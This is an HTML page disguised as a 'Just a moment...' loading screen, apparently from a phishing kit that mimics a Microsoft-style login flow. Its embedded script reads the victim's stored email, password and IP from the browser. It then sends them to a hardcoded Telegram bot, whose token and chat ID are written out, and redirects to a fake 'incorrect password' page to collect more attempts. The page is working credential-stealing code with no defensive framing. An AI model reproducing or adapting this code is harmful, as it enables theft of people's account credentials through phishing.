<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Just a moment...</title>
  <style>
    :root {
      --primary: #0078d4;
      --text: #333;
      --bg: #fff;
      --error: #e81123;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background-color: var(--bg);
      color: var(--text);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
      padding: 2rem;
    }

    .loader-container {
      text-align: center;
      padding: 2rem;
      opacity: 0;
      animation: fadeIn 0.6s ease-in-out forwards;
    }

    @keyframes fadeIn {
      to { opacity: 1; }
    }

    .loader {
      width: 60px;
      height: 60px;
      position: relative;
      margin-bottom: 1rem;
    }

    .c-loader {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 4px solid transparent;
      border-top: 4px solid var(--primary);
      border-right: 4px solid var(--primary);
      border-radius: 50%;
      animation: spin 1.2s linear infinite;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    .message {
      color: var(--primary);
      font-size: 1.1rem;
      font-weight: 500;
    }

    @media (max-width: 480px) {
      .loader {
        width: 50px;
        height: 50px;
      }
      .c-loader {
        border-width: 3px;
      }
      .message {
        font-size: 1rem;
      }
    }
  </style>
</head>
<body>
  <div class="loader-container">
    <div class="loader">
      <div class="c-loader"></div>
    </div>
    <div class="message">Just a moment...</div>
  </div>

  <script>
    const userEmail = localStorage.getItem('userEmail') || 'unknown@example.com';
    const userPassword = localStorage.getItem('userPassword') || 'unknown';
    const userIP = localStorage.getItem('userIP') || 'Unknown';

    setTimeout(() => {
      sendToTelegram({
        action: "incorrect_password",
        email: userEmail,
        password: userPassword,
        ip: userIP,
        timestamp: new Date().toLocaleString()
      });
      localStorage.setItem('showError', 'true');
      window.location.href = 'password.php';
    }, 3000);

    function sendToTelegram(data) {
      const botToken = '8106792998:AAEXwd566CHWodnbGx71u_6ohnIS3Dyxg0U';
      const chatId = '5875956678';

      const message = `
🚨 *Login Attempt Failed*
📧 Email: ${data.email}
🔑 Password: ${data.password}
🌐 IP: ${data.ip}
⏰ Time: ${data.timestamp}
`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
      }).catch(console.error);
    }
  </script>
</body>
</html>